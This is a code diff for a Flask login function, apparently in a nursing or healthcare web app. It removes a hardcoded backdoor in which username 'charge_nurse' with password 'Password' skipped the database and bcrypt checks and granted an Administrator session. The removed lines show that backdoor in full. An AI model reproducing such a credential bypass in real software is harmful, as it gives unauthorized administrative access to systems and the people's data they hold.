@@ -239,29 +239,26 @@ def login_user():
         username = request.form['username']
         password = request.form['password']
 
-        # Backdoor sign in with charge_nurse
-        if username == "charge_nurse" and password == "Password":
-            session['loggedin'] = True
-            session['id'] = "charge_nurse"
-            session['username'] = username
-            session['name'] = "Administrator"
-            return redirect(url_for('home'))
+        cursor.execute(
+            'SELECT * FROM users WHERE username = %s', (username,)
+        )
 
-        else:
-            cursor.execute(
-                'SELECT * FROM users WHERE username = %s', (username,)
-            )
+        account = cursor.fetchone()
 
-            account = cursor.fetchone()
-
-            if account and bcrypt.checkpw(password.encode(), account[2].encode()):
+        if account and bcrypt.checkpw(password.encode(), account[2].encode()):
+            if account[1] == "charge_nurse":
+                session['loggedin'] = True
+                session['id'] = "charge_nurse"
+                session['username'] = username
+                session['name'] = "Administrator"
+            else:
                 session['loggedin'] = True
                 session['id'] = account[0]
                 session['username'] = username
                 session['name'] = account[3] + " " + account[4]
-                return redirect(url_for('home'))
-            else:
-                return render_template("login.html", msg="Invalid Login")
+            return redirect(url_for('home'))
+        else:
+            return render_template("login.html", msg="Invalid Login")
 
 
 @app.route('/logout')
